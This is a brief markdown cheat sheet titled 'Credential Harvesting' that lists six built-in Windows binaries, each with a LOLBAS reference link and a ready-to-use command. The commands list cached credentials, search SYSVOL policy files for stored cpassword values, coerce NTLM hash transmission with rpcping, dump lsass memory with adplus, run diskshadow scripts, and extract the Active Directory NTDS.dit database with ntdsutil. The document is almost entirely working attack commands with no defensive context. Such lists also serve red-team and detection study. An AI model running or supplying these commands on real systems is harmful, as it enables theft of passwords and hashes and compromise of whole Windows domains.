# Credential Harvesting
1. cmdkey
https://lolbas-project.github.io/lolbas/Binaries/Cmdkey/#credentials

List cached credentials
```
cmdkey /list
```
2. findstr
https://lolbas-project.github.io/lolbas/Binaries/Findstr/#credentials

Search for stored password in Group Policy files stored on SYSVOL.
```
findstr /S /I cpassword \\sysvol\policies\*.xml
```
3. rpcping
https://lolbas-project.github.io/lolbas/Binaries/Rpcping/#credentials

Send a RPC test connection to the target server (-s) and force the NTLM hash to be sent in the process.
```
rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM
```
4. adplus.exe
https://lolbas-project.github.io/lolbas/OtherMSBinaries/Adplus/#dump

Creates a memory dump of the lsass process
```
adplus.exe -hang -pn lsass.exe -o c:\users\mr.d0x\output\folder -quiet
```
5. diskshadow
https://lolbas-project.github.io/lolbas/Binaries/Diskshadow/

Execute commands using diskshadow.exe from a prepared diskshadow script.
```
diskshadow.exe /s c:\test\diskshadow.txt
```
6. ntdsutil
https://lolbas-project.github.io/lolbas/OtherMSBinaries/Ntdsutil/

Dumping of Active Directory NTDS.dit database into folder
```
ntdsutil.exe "ac i ntds" "ifm" "create full c:\" q q
```






